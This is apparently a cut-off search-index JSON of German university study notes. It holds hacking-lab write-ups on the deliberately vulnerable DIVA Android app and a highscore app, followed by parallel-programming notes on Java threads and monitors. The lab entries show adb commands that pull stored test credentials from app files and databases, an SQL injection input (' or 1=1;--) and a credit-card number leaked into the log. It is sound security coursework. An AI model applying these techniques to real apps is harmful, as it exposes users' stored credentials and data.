            "text": "Der Traffic ist nicht verschl\u00fcsselt, was ein Abh\u00f6ren sehr einfach macht  Das Posten des Highscores braucht keinerlei Authentifizierung  Der Schl\u00fcssel f\u00fcr die AES256-Verschl\u00fcsselung ist hard-coded in der App  Irgendwo muss der Key abgelegt Client-seitig abgelegt werden, es ist also unm\u00f6glich, ihn komplett geheim zu halten    Es wird nicht gepr\u00fcft, ob ein Highscore \u00fcberhaupt realistisch ist, er kann beliebig gross werden", 
            "title": "Sicherheits-Probleme"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4216_Folklore_App/#mitigation", 
            "text": "Solche Highscore-Games, wo ein Client ein Highscore an den Server schickt, sind von Natur aus sehr schwer abzusichern, eine 100%ige-Sicherheit ist sogar unnm\u00f6glich, weil der Angreifer komplette Kontrolle \u00fcber den Client hat. Auch wenn lokale Encryption-Keys verwendet werden, k\u00f6nnen diese immer aus dem Binary oder dem de-compilierten Sourcecode gelsen werden. Der Server kann nie mit absoluter Sicherheit wissen, ob ein Highscore wirklich g\u00fcltig ist. Eine Authentisierung mit Token n\u00fctzt auch nicht viel, da der Angreifer dies einfach auslesen und selbst benutzen kann.  Allerdings kann man einige H\u00fcrden einbauen, die einen Angriff komplizierter und teurer machen. Hier werden nur ein paar aufgez\u00e4hlt, geordnet nach den Offensichtlichsten:   TLS verwenden  Authentifizierung mit dem Highscore-Server, z.B. \u00fcber ein Cookie oder Session-Token, das beim Highscore-Request mitgeschickt wird  Un\u00fcblich hohe Highscores ignorieren  Requests limitieren, die von einem User gemacht werden  Zu Beginn ein vom Server verschl\u00fcsseltes Token senden (mit z.B. der User ID), dass dann beim Highscore-Request vom Client mitgeschickt wird  Mit dem Token pr\u00fcfen, wie lang ein Spiel dauert, und Highscore von zu kurzen oder zu langen Spielen verwerfen  W\u00e4hrend dem Spielen kontinuierlich den Zwischen-Score zum Server schicken, der die Punktzahl selbst hochz\u00e4hlen kann   Eine gute Zusammenfassung zum Thema ist auch in dieser Stackoverflow-Antwort zu finden:  http://stackoverflow.com/a/74841", 
            "title": "Mitigation"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4250_M2/", 
            "text": "4250 DIVA App: M2 Insecure Data Storage\n\n\n\n\nRobin Suter\n\n\n\n\nPart 1 - Shared Preferences\n\n\nShared preference file auslesen:\n\n\n$ \ncd\n /data/data/jakhar.aseem.diva/shared_prefs\n$ cat jakhar.aseem.diva_preferences.xml\n\n\n\n\n\n?xml version=\n1.0\n encoding=\nutf-8\n standalone=\nyes\n ?\n\n\nmap\n\n    \nstring\n \nname=\nuser\nchief\n/string\n\n    \nstring\n \nname=\npassword\nmysecretpassword!!\n/string\n\n\n/map\n\n\n\n\n\n\nPart 2 - SQLite\n\n\nDas SQLite-File liegt unter \n/data/data/jakhar.aseem.diva/databases/ids2\n\n\n$ adb pull /data/data/jakhar.aseem.diva/databases/ids2 /tmp/ids2\n$ sqlite /tmp/ids2\n\n\n\n\n\n\n\nTabelle herausfinden:\n\n\n\n\nSELECT\n \nname\n \nFROM\n \nsqlite_master\n \nWHERE\n \ntype\n=\ntable\n;\n\n\n\n\n\n\nandroid_metadata\nmyuser\n\n\n\n\n\n\n\nUser / Passwort rauslesen:\n\n\n\n\nselect\n \n*\n \nfrom\n \nmyuser\n;\n\n\n\n\n\n\nboss|mypass123", 
            "title": "4250 M2"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4250_M2/#4250-diva-app-m2-insecure-data-storage", 
            "text": "Robin Suter", 
            "title": "4250 DIVA App: M2 Insecure Data Storage"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4250_M2/#part-1-shared-preferences", 
            "text": "Shared preference file auslesen:  $  cd  /data/data/jakhar.aseem.diva/shared_prefs\n$ cat jakhar.aseem.diva_preferences.xml  ?xml version= 1.0  encoding= utf-8  standalone= yes  ?  map \n     string   name= user chief /string \n     string   name= password mysecretpassword!! /string  /map", 
            "title": "Part 1 - Shared Preferences"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4250_M2/#part-2-sqlite", 
            "text": "Das SQLite-File liegt unter  /data/data/jakhar.aseem.diva/databases/ids2  $ adb pull /data/data/jakhar.aseem.diva/databases/ids2 /tmp/ids2\n$ sqlite /tmp/ids2   Tabelle herausfinden:   SELECT   name   FROM   sqlite_master   WHERE   type = table ;   android_metadata\nmyuser   User / Passwort rauslesen:   select   *   from   myuser ;   boss|mypass123", 
            "title": "Part 2 - SQLite"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4251_M7/", 
            "text": "4251 DIVA App: M7 Client Code Quality\n\n\nSQL Injection\n\n\nAlle User abrufen mit Eingabe \n' or 1=1;--", 
            "title": "4251 M7"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4251_M7/#4251-diva-app-m7-client-code-quality", 
            "text": "", 
            "title": "4251 DIVA App: M7 Client Code Quality"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4251_M7/#sql-injection", 
            "text": "Alle User abrufen mit Eingabe  ' or 1=1;--", 
            "title": "SQL Injection"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4252_M2/", 
            "text": "4252 DIVA App: M2 Unintended Data Leakage\n\n\nMit \nadb logcat\n wird kontinuierlich der komplette Log angezeigt.\n\n\nBei Auftreten des Fehlers in der App erscheint im Log eine Meldung von \ndiva-log\n. Nach diesem k\u00f6nnen wir filtern:\n\n\n$ adb logcat \n|\n grep diva-log\n\n\n\n\n\n04-07 11:51:07.166  2565  2565 E diva-log: Error while processing transaction with credit card: 12345678933\n\n\n\n\n\nHier wurde direkt die Eingabe der Kreditkartennumer \n12345678933\n ins Log geschrieben", 
            "title": "4252 M2"
        }, 
        {
            "location": "/InfSi3/hacking-lab/4252_M2/#4252-diva-app-m2-unintended-data-leakage", 
            "text": "Mit  adb logcat  wird kontinuierlich der komplette Log angezeigt.  Bei Auftreten des Fehlers in der App erscheint im Log eine Meldung von  diva-log . Nach diesem k\u00f6nnen wir filtern:  $ adb logcat  |  grep diva-log  04-07 11:51:07.166  2565  2565 E diva-log: Error while processing transaction with credit card: 12345678933  Hier wurde direkt die Eingabe der Kreditkartennumer  12345678933  ins Log geschrieben", 
            "title": "4252 DIVA App: M2 Unintended Data Leakage"
        }, 
        {
            "location": "/ParProg/0_Index/", 
            "text": "Parallele Programmierung\n\n\n\n\nExam Notes\n\n\nMulti-Threading Grundlagen\n\n\nThread Synchronisation\n\n\nSynchronisationsprimitiven\n\n\nGefahren der Nebenl\u00e4ufigket\n\n\nThread Pools", 
            "title": "0 Index"
        }, 
        {
            "location": "/ParProg/0_Index/#parallele-programmierung", 
            "text": "Exam Notes  Multi-Threading Grundlagen  Thread Synchronisation  Synchronisationsprimitiven  Gefahren der Nebenl\u00e4ufigket  Thread Pools", 
            "title": "Parallele Programmierung"
        }, 
        {
            "location": "/ParProg/10_Actor_Model/", 
            "text": "Actor Model\n\n\n\n\nObjekte sind in diesem Paradigma \"aktiv\"\n\n\nAktive Objekte haben ein nebenl\u00e4ufiges Innenleben\n\n\nAlle aktiven Objekte (=Actors) laufen nebenl\u00e4ufig\n\n\nKommunikation \u00fcber Nachrichtenaustausch\n\n\nErlaubt auch einfache Verteilung\n\n\n\n\n\n\nKein shared memory zwischen den Objekten\n\n\n\n\nAkka\n\n\n\n\nJVM-Implementierung vom Actor Model\n\n\nIn einem Actor werden Nachrichten immer sequentiell abgearbeitet - keine Synchronisation n\u00f6tig\n\n\nNachrichten sind beliebige Objekte\n\n\nJava kennt nur \"untyped\" Actors, messages sind immer Typ \nobject\n\n\n\n\n\n\nActorRef\n ist eine Adresse eines Actors\n\n\nReferenz bleibt dieselbe, auch wenn der Actor crashed und neu erstellt wird\n\n\n\n\n\n\n\n\nActor Hierarchies\n\n\n\n\nWenn ein Actor weitere Actors erstellt, ist er \"parent\" davon und zust\u00e4ndig\n\n\nBroadcast-Messsages \u00fcber ActorSelectors", 
            "title": "10 Actor Model"
        }, 
        {
            "location": "/ParProg/10_Actor_Model/#actor-model", 
            "text": "Objekte sind in diesem Paradigma \"aktiv\"  Aktive Objekte haben ein nebenl\u00e4ufiges Innenleben  Alle aktiven Objekte (=Actors) laufen nebenl\u00e4ufig  Kommunikation \u00fcber Nachrichtenaustausch  Erlaubt auch einfache Verteilung    Kein shared memory zwischen den Objekten", 
            "title": "Actor Model"
        }, 
        {
            "location": "/ParProg/10_Actor_Model/#akka", 
            "text": "JVM-Implementierung vom Actor Model  In einem Actor werden Nachrichten immer sequentiell abgearbeitet - keine Synchronisation n\u00f6tig  Nachrichten sind beliebige Objekte  Java kennt nur \"untyped\" Actors, messages sind immer Typ  object    ActorRef  ist eine Adresse eines Actors  Referenz bleibt dieselbe, auch wenn der Actor crashed und neu erstellt wird", 
            "title": "Akka"
        }, 
        {
            "location": "/ParProg/10_Actor_Model/#actor-hierarchies", 
            "text": "Wenn ein Actor weitere Actors erstellt, ist er \"parent\" davon und zust\u00e4ndig  Broadcast-Messsages \u00fcber ActorSelectors", 
            "title": "Actor Hierarchies"
        }, 
        {
            "location": "/ParProg/1_Exam/", 
            "text": "Exam\n\n\nHilfsmittel\n\n\n\n\n1 A4 beidseitig", 
            "title": "1 Exam"
        }, 
        {
            "location": "/ParProg/1_Exam/#exam", 
            "text": "", 
            "title": "Exam"
        }, 
        {
            "location": "/ParProg/1_Exam/#hilfsmittel", 
            "text": "1 A4 beidseitig", 
            "title": "Hilfsmittel"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/", 
            "text": "Multi-Threading Grundlagen\n\n\nMotivation\n\n\n\n\nReale Prozesse abbilden (Druckjobs, Server-Client)\n\n\nPerfromance-Steigerung\n\n\n\n\nSeit 2003 stagnieren Taktraten, stattdessen wird mehr auf Hyperthreading und mehrere Kerne gesetzt. Deshalb m\u00fcssen Programme darauf optimiert werden\n\n\n\n\n\n\nHyperthreading (Virtual Threading): Ein CPU-Core hat zwei Register-Sets, aber immer noch nur ein Rechenwerk (ALU)\n\n\n\n\nIst nicht \"echte\" Parallelisierung\n\n\n\n\n\n\n\n\nParallelit\u00e4t vs. Nebenl\u00e4ufigkeit\n\n\n\n\nParallelit\u00e4t\n:  Zerlegung eines Ablaufs in mehrere Teilabl\u00e4ufe, welche gleichzeitig auf mehreren Prozessoren laufen\n\n\nNebenl\u00e4ufigkeit\n (Concurrency): Gleichzeitig oder verzahnt ausf\u00fchrbare Abl\u00e4ufe, welche auf gemeinsame Ressourcen zugreifen.\n\n\n\u00c4lteres Prinzip, z.B. Drucker\n\n\nKann anschein von Parallelit\u00e4t haben, aber es wird immer nur etwas auf einmal ausgef\u00fchrt\n\n\n\n\n\n\n\n\n\n\nSystem Grundlagen Repetition\n\n\nThreads\n\n\n\n\nParallele Ablaufsequenz innerhalb eines Programms, teilen den Adressraum mit dem ganzen Prozess\n\n\nIst g\u00fcnstiger als eigener Prozess, braucht keine eigene Pagetable\n\n\nJeder Thread hat eigenen Stack\n\n\nUser-Level-Thread: Im Prozess implementiert, keine echte Parallelit\u00e4t durch mehrere Prozessoren\n\n\nKernel-Level-Thread: Im Kernel implementiert, kann Multi-Core ausnutzen. Wechsel per SW-Interrupt, ist also nicht ganz \"gratis\"\n\n\nScheduling: Ein CPU-Core kann immer nur ein Thread gleichzeitig ausf\u00fchren. Scheduler teilt die Threads zu\n\n\nWenn nur ein Prozessor Threads verarbeitet, ist es eine Quasi-Parallelisierung\n\n\n\n\nProgrammierung hat f\u00fcr \"echte\" oder \"quasi\"-Parallelit\u00e4t die gleichen Probleme, weil man nie weiss, wann die Kontextwechsel geschehen\n\n\n\n\n\n\nKontextwechsel\n\n\n\n\nSynchron\n: Thread wartet auf Bedingung, gibt den Prozessor selbst frei\n\n\nAsynchron\n: Nach gewisser Zeit wird der Thread gewzungen, die CPU freizugeben\n\n\n\n\n\n\nMulti-Tasking\n\n\nKooperativ\n: Threads m\u00fcssen explizit synchrone Kontextwechsel initiieren\n\n\nPreemptive\n: Scheduler unterbricht den Thread \nasynchron\n in gewissen Zeitintervallen\n\n\nHeute in der Regel immer \npreemptive\n!\n\n\n\n\n\n\n\n\n\n\nNote\n\n\nTodo: Bild Folie 30\n\n\n\n\nGrundlagen Java Threads\n\n\n\n\nJVM ist ein Single Process System\n\n\nMain-Thread f\u00fchrt die \nmain()\n-Methode aus (per Reflection)\n\n\nProgrammierer kann weitere Threads starten\n\n\nLaufzeitsystem startet auch eigene Threads, z.B. GC\n\n\nDie JVM l\u00e4uft solange, bis kein (nicht-Daemon-) Thread mehr l\u00e4uft\n\n\nDaemon-Thread ist z.B. GC, wird bei Ende der JVM unkontrolliert beendet\n\n\n\n\n\n\n\n\nclass\n \nSimpleThread\n \nextends\n \nThread\n \n{\n\n    \n@Override\n\n    \npublic\n \nvoid\n \nrun\n()\n \n{\n\n        \n// thread behavior\n\n\n        \n// thread ends when run() exits \n\n        \n// (or unhandled exception orccurs)\n\n    \n}\n\n\n}\n\n\nThread\n \nmyThread\n \n=\n \nnew\n \nSimpleThread\n();\n\n\nmyThread\n.\nstart\n();\n\n\n\n\n\n\n\n\nWenn unbehandelte Exception in Thread auftritt, laufen andere Threads weiter (in Java, andere Umgebungen anders)\n\n\nThreads laufen ohne Vorkehrungen beliebig verzahnt, \nnicht-deterministischer Ablauf!\n\n\n\n\nRunnable Implementierung statt Vererbung:\n\n\nclass\n \nSimpleLogic\n \nimplements\n \nRunnable\n \n{\n\n    \n@Override\n\n    \npublic\n \nvoid\n \nrun\n()\n \n{\n\n        \n// thread behavior\n\n    \n}\n\n\n}\n\n\n// Pass Runnable to Thread constructor!\n\n\nThread\n \nmyThread\n \n=\n \nnew\n \nThread\n(\nnew\n \nSimpleLogic\n());\n\n\nmyThread\n.\nstart\n();\n\n\n\n\n\n\n\n\nRunnable\n-Interface hat 1 Methode -\n Functional Interface!\n\n\nKann mit Lambdas verwendet werden\n\n\n\n\n\n\n\n\nThread\n \nmyThread\n \n=\n \nnew\n \nThread\n(()\n \n-\n \n{\n\n    \n// thread behavior\n\n\n});\n\n\nmyThread\n.\nstart\n();\n\n\n\n\n\n\n\n\nMit \nThread.sleep(t[ms])\n kann der Thread schlafen gelegt werden\n\n\nThread.yield()\n gibt Thread frei, aber wird gleich wieder \nready\n. Provoziert Thread-Wechsel\n\n\nSollte man nicht verwenden, weil OS das Scheduling selbst verwaltet\n\n\n\n\n\n\nt.join()\n wartet solange, bis der Thread \nt\n terminiert\n\n\n\n\nThread\n \nmyThread\n \n=\n \nnew\n \nThread\n(()\n \n-\n \n{\n\n    \n// thread behavior\n\n\n});\n\n\nmyThread\n.\nstart\n();\n\n\n// Thread started\n\n\nmyThread\n.\njoin\n();\n\n\n// Thread finished\n\n\n\n\n\n\n\n\nThreads k\u00f6nnen von Aussen unterbrochen werden mit \nt.interrupt()\n\n\nL\u00f6st \nInterruptedException\n aus\n\n\nWird meist missbraucht zum Aufbrechen von Blockaden (schlecht!)", 
            "title": "2 Multi Threading Grundlagen"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/#multi-threading-grundlagen", 
            "text": "", 
            "title": "Multi-Threading Grundlagen"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/#motivation", 
            "text": "Reale Prozesse abbilden (Druckjobs, Server-Client)  Perfromance-Steigerung   Seit 2003 stagnieren Taktraten, stattdessen wird mehr auf Hyperthreading und mehrere Kerne gesetzt. Deshalb m\u00fcssen Programme darauf optimiert werden    Hyperthreading (Virtual Threading): Ein CPU-Core hat zwei Register-Sets, aber immer noch nur ein Rechenwerk (ALU)   Ist nicht \"echte\" Parallelisierung", 
            "title": "Motivation"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/#parallelitat-vs-nebenlaufigkeit", 
            "text": "Parallelit\u00e4t :  Zerlegung eines Ablaufs in mehrere Teilabl\u00e4ufe, welche gleichzeitig auf mehreren Prozessoren laufen  Nebenl\u00e4ufigkeit  (Concurrency): Gleichzeitig oder verzahnt ausf\u00fchrbare Abl\u00e4ufe, welche auf gemeinsame Ressourcen zugreifen.  \u00c4lteres Prinzip, z.B. Drucker  Kann anschein von Parallelit\u00e4t haben, aber es wird immer nur etwas auf einmal ausgef\u00fchrt", 
            "title": "Parallelit\u00e4t vs. Nebenl\u00e4ufigkeit"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/#system-grundlagen-repetition", 
            "text": "", 
            "title": "System Grundlagen Repetition"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/#threads", 
            "text": "Parallele Ablaufsequenz innerhalb eines Programms, teilen den Adressraum mit dem ganzen Prozess  Ist g\u00fcnstiger als eigener Prozess, braucht keine eigene Pagetable  Jeder Thread hat eigenen Stack  User-Level-Thread: Im Prozess implementiert, keine echte Parallelit\u00e4t durch mehrere Prozessoren  Kernel-Level-Thread: Im Kernel implementiert, kann Multi-Core ausnutzen. Wechsel per SW-Interrupt, ist also nicht ganz \"gratis\"  Scheduling: Ein CPU-Core kann immer nur ein Thread gleichzeitig ausf\u00fchren. Scheduler teilt die Threads zu  Wenn nur ein Prozessor Threads verarbeitet, ist es eine Quasi-Parallelisierung   Programmierung hat f\u00fcr \"echte\" oder \"quasi\"-Parallelit\u00e4t die gleichen Probleme, weil man nie weiss, wann die Kontextwechsel geschehen    Kontextwechsel   Synchron : Thread wartet auf Bedingung, gibt den Prozessor selbst frei  Asynchron : Nach gewisser Zeit wird der Thread gewzungen, die CPU freizugeben    Multi-Tasking  Kooperativ : Threads m\u00fcssen explizit synchrone Kontextwechsel initiieren  Preemptive : Scheduler unterbricht den Thread  asynchron  in gewissen Zeitintervallen  Heute in der Regel immer  preemptive !      Note  Todo: Bild Folie 30", 
            "title": "Threads"
        }, 
        {
            "location": "/ParProg/2_Multi-Threading_Grundlagen/#grundlagen-java-threads", 
            "text": "JVM ist ein Single Process System  Main-Thread f\u00fchrt die  main() -Methode aus (per Reflection)  Programmierer kann weitere Threads starten  Laufzeitsystem startet auch eigene Threads, z.B. GC  Die JVM l\u00e4uft solange, bis kein (nicht-Daemon-) Thread mehr l\u00e4uft  Daemon-Thread ist z.B. GC, wird bei Ende der JVM unkontrolliert beendet     class   SimpleThread   extends   Thread   { \n     @Override \n     public   void   run ()   { \n         // thread behavior \n\n         // thread ends when run() exits  \n         // (or unhandled exception orccurs) \n     }  }  Thread   myThread   =   new   SimpleThread ();  myThread . start ();    Wenn unbehandelte Exception in Thread auftritt, laufen andere Threads weiter (in Java, andere Umgebungen anders)  Threads laufen ohne Vorkehrungen beliebig verzahnt,  nicht-deterministischer Ablauf!   Runnable Implementierung statt Vererbung:  class   SimpleLogic   implements   Runnable   { \n     @Override \n     public   void   run ()   { \n         // thread behavior \n     }  }  // Pass Runnable to Thread constructor!  Thread   myThread   =   new   Thread ( new   SimpleLogic ());  myThread . start ();    Runnable -Interface hat 1 Methode -  Functional Interface!  Kann mit Lambdas verwendet werden     Thread   myThread   =   new   Thread (()   -   { \n     // thread behavior  });  myThread . start ();    Mit  Thread.sleep(t[ms])  kann der Thread schlafen gelegt werden  Thread.yield()  gibt Thread frei, aber wird gleich wieder  ready . Provoziert Thread-Wechsel  Sollte man nicht verwenden, weil OS das Scheduling selbst verwaltet    t.join()  wartet solange, bis der Thread  t  terminiert   Thread   myThread   =   new   Thread (()   -   { \n     // thread behavior  });  myThread . start ();  // Thread started  myThread . join ();  // Thread finished    Threads k\u00f6nnen von Aussen unterbrochen werden mit  t.interrupt()  L\u00f6st  InterruptedException  aus  Wird meist missbraucht zum Aufbrechen von Blockaden (schlecht!)", 
            "title": "Grundlagen Java Threads"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/", 
            "text": "Thread Synchronisation\n\n\n\n\nNote\n\n\nThread.currentThread().join()\n \n\n\nProgramm wartet ewig, weil es auf die Beendigung von sich selbst wartet\n\n\n\n\n\n\nSynchronisation = Einschr\u00e4nkung der Nebenl\u00e4ufigkeit\n\n\nF\u00e4lle f\u00fcr Synchronisation\n\n\nGegenseitiger Ausschluss: Eine Ressource kann nur von jemandem auf einmal benutzt werden\n\n\nWarten auf Bedingung\n\n\n\n\n\n\n\n\nGemeinsame Ressourcen\n\n\n\n\nThreads k\u00f6nnen sich gegenseitig st\u00f6ren, weil sie sich Adressraum und Heap teilen\n\n\nIn Java k\u00f6nnen lokale Variablen (closure) von Threads nur read-only zugegriffen werden\n\n\n\n\nKritische Abschnitte\n\n\n\n\nRace Condition: Fehler aufgrund von unkontrollierter Nebenl\u00e4ufigkeit\n\n\nRace Condition Szenario\n\n\nBeide Threads lesen die aktuelle Balance nacheinander in ein Register\n\n\nDer zweite Thread, der die Balance zur\u00fcck schreibt, \u00fcberschreibt den anderen Wert\n\n\n-\n Lost Update\n\n\n\n\n\n\nEin Programmst\u00fcck, dass eine Race Condition verursachen k\u00f6nnte, ist eine \"Critical Section\"\n\n\nNaiver Ansatz: \"Locked\"-Boolean einf\u00fchren und evtl. warten, bis \nlocked == false\n ist\n\n\nProblem: Pr\u00fcfung des boolean und Zuweisung nicht atomar -\n Gleiches Problem wie vorher\n\n\n\n\n\n\n\n\nGegenseitiger Ausschluss\n\n\n\n\nEigene Implementierung nicht trivial (gibt spezielle Algorithmen)\n\n\nWeitere Probleme mit CPU-Optimierungen, Reihenfolge der Instruktionen ist nicht garantiert\n\n\nBusy-Waiting (Endlosschleife) ist ineffizient\n\n\n\n\nJava Monitor Konzept\n\n\npublic\n \nsynchronized\n \nvoid\n \ndeposit\n(\nint\n \namount\n)\n \n{\n\n    \nthis\n.\nbalance\n \n+=\n \namount\n;\n \n// Kritischer Abschnitt\n\n\n}\n\n\n\n\n\n\n\n\nBody der Funktion wird unter gegenseitigem Ausschluss ausgef\u00fchrt\n\n\nNur ein Thread auf einmal kann die Methode ausf\u00fchren\n\n\nBei jedem Eintritt wird das Objekt gelockt (Monitor-Lock)\n\n\n\n\nGilt f\u00fcr das ganze Objekt, auch andere synchronized-Methoden schliessen sich gegenseitig aus\n\n\n\n\n\n\nFreigabe des Locks bei Ende, return oder unhandled Exception\n\n\n\n\n\n\nRecursive Locks: \nsynchronized\n Method ruft andere \nsynchronized\n Method auf (nested Lock)\n\n\n\n\nIst in Java kein Problem, in anderen Sprachen u.U. schon\n\n\n\n\n\n\n\n\nSynchronized Statements\n\n\n\n\nsynchronized(object) { statements }\n\n\nobject\n bezieht sich auf das Objekt, das gelockt wird\n\n\nBei \nsynchronized\n mit Static-Klassen wird \nclass\n.class\n mitgegeben, dann wird die Klasse gelockt (Singleton)\n\n\n\n\nWarten auf Bedingung\n\n\n\n\nNaiver Ansatz: in Schleife warten, bis Bedingung erf\u00fcllt\n\n\nFunktioniert nicht: Lock wird nicht aufgel\u00f6st, es kann niemand anders das Objekt bearbeiten\n\n\nIneffizent, immer zu pollen\n\n\n\n\n\n\n\n\nWait \n Signal\n\n\n\n\nMonitor: Gegenseitiger Ausschluss + Wait \n Signal Mechanismus\n\n\nNur ein Thread kann \"im Monitor\" sein\n\n\nSpezieller Wartebereich f\u00fcr Threads, die auf eine Bedingung warten\n\n\nSie werden signalisiert, sobald die Bedingung erf\u00fcllt ist\n\n\n\n\nclass\n \nBankAccount\n \n{\n\n    \nprivate\n \nint\n \nbalance\n \n=\n \n0\n;\n\n    \npublic\n \nsynchronized\n \nvoid\n \nwithdraw\n(\nint\n \namount\n)\n\n        \nthrows\n \nInterruptedException\n \n{\n\n        \nwhile\n \n(\namount\n \n \nbalance\n)\n \n{\n\n            \nwait\n();\n\n        \n}\n\n        \nbalance\n \n-=\n \namount\n;\n\n        \n}\n\n    \npublic\n \nsynchronized\n \nvoid\n \ndeposit\n(\nint\n \namount\n)\n \n{\n\n        \nbalance\n \n+=\n \namount\n;\n\n        \nnotifyAll\n();\n\n    \n}\n\n\n}\n\n\n\n\n\n\n\n\nwait()\n setzt den Thread in die Warteschlange zum Warten auf eine Bedingung\n\n\nnotifyAll()\n weckt alle im Monitor wartenden Thread auf\n\n\nBeh\u00e4lt aber den Monitor-Lock f\u00fcr weitere Instruktionen (\"Single and Continue\")\n\n\n\n\n\n\nEin aufgeweckter Thread geht wieder in den \"\u00e4usseren\" Warteraum, genau wie alle anderen eintrittswilligen Threads\n\n\n\n\n\n\n\n\nWieso funktioniert das?\n\n\nwait()\n setzt sich in den \"Warteraum\" und gibt den Monitor (den Lock auf das Objekt) frei\n\n\n\n\n\n\nnotify()\n weckt einen \nbeliebigen\n Thread im \"Warteraum\" auf\n\n\nDie Reihenfolge im \"Warteraum\" ist in Java nicht spezifiziert (in .NET FIFO)\n\n\nSpurious Wakeup: Ein wartender Thread kann \"f\u00e4lschlicherweise\" aufgeweckt werden, ohne dass \nnotify\n aufgerufen wurde\n\n\nProblem von POSIX-Threads\n\n\n\n\n\n\n\n\n\n\nFallstricke beim Java Monitor\n\n\nWait mit If\n\n\n\n\nNach dem \nwait()\n muss die Bedingung wieder \u00fcberpr\u00fcft werden\n\n\nIn der Zwischenzeit k\u00f6nnte nach dem \nnotify()\n und vor dem Eintreten die Bedingung wieder invalidiert werden\n\n\nDaher: \nwhile (!conditioin) { wait(); }\n\n\n\n\n\n\n\n\nSingle-Notify\n\n\n\n\nnotify()\n weckt ein beliebiger einzelner Thread auf\n\n\nWenn immer ein falscher Thread aufgeweckt wird, terminiert das Programm nie\n\n\nL\u00f6sung: \nnotifyAll()\n verwenden\n\n\n\n\nEffizenz-Probleme\n\n\n\n\nnotifyAll()\n weckt alle auf, bei vielen Threads ist das viel Overhead f\u00fcr die \u00dcberpr\u00fcfung der Bedingung\n\n\nKeine Fairness: Keine Warteschlange spezifiziert\n\n\nSignal-and-Continue: Informierte muss neu anstehen und k\u00f6nnen st\u00e4ndig \u00fcberholt werden\n\n\nAuch bei FIFO (.NET) nicht garantiert fair", 
            "title": "3 Thread Synchronisation"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#thread-synchronisation", 
            "text": "Note  Thread.currentThread().join()    Programm wartet ewig, weil es auf die Beendigung von sich selbst wartet    Synchronisation = Einschr\u00e4nkung der Nebenl\u00e4ufigkeit  F\u00e4lle f\u00fcr Synchronisation  Gegenseitiger Ausschluss: Eine Ressource kann nur von jemandem auf einmal benutzt werden  Warten auf Bedingung", 
            "title": "Thread Synchronisation"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#gemeinsame-ressourcen", 
            "text": "Threads k\u00f6nnen sich gegenseitig st\u00f6ren, weil sie sich Adressraum und Heap teilen  In Java k\u00f6nnen lokale Variablen (closure) von Threads nur read-only zugegriffen werden", 
            "title": "Gemeinsame Ressourcen"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#kritische-abschnitte", 
            "text": "Race Condition: Fehler aufgrund von unkontrollierter Nebenl\u00e4ufigkeit  Race Condition Szenario  Beide Threads lesen die aktuelle Balance nacheinander in ein Register  Der zweite Thread, der die Balance zur\u00fcck schreibt, \u00fcberschreibt den anderen Wert  -  Lost Update    Ein Programmst\u00fcck, dass eine Race Condition verursachen k\u00f6nnte, ist eine \"Critical Section\"  Naiver Ansatz: \"Locked\"-Boolean einf\u00fchren und evtl. warten, bis  locked == false  ist  Problem: Pr\u00fcfung des boolean und Zuweisung nicht atomar -  Gleiches Problem wie vorher", 
            "title": "Kritische Abschnitte"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#gegenseitiger-ausschluss", 
            "text": "Eigene Implementierung nicht trivial (gibt spezielle Algorithmen)  Weitere Probleme mit CPU-Optimierungen, Reihenfolge der Instruktionen ist nicht garantiert  Busy-Waiting (Endlosschleife) ist ineffizient", 
            "title": "Gegenseitiger Ausschluss"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#java-monitor-konzept", 
            "text": "public   synchronized   void   deposit ( int   amount )   { \n     this . balance   +=   amount ;   // Kritischer Abschnitt  }    Body der Funktion wird unter gegenseitigem Ausschluss ausgef\u00fchrt  Nur ein Thread auf einmal kann die Methode ausf\u00fchren  Bei jedem Eintritt wird das Objekt gelockt (Monitor-Lock)   Gilt f\u00fcr das ganze Objekt, auch andere synchronized-Methoden schliessen sich gegenseitig aus    Freigabe des Locks bei Ende, return oder unhandled Exception    Recursive Locks:  synchronized  Method ruft andere  synchronized  Method auf (nested Lock)   Ist in Java kein Problem, in anderen Sprachen u.U. schon", 
            "title": "Java Monitor Konzept"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#synchronized-statements", 
            "text": "synchronized(object) { statements }  object  bezieht sich auf das Objekt, das gelockt wird  Bei  synchronized  mit Static-Klassen wird  class .class  mitgegeben, dann wird die Klasse gelockt (Singleton)", 
            "title": "Synchronized Statements"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#warten-auf-bedingung", 
            "text": "Naiver Ansatz: in Schleife warten, bis Bedingung erf\u00fcllt  Funktioniert nicht: Lock wird nicht aufgel\u00f6st, es kann niemand anders das Objekt bearbeiten  Ineffizent, immer zu pollen", 
            "title": "Warten auf Bedingung"
        }, 
        {
            "location": "/ParProg/3_Thread-Synchronisation/#wait-signal", 
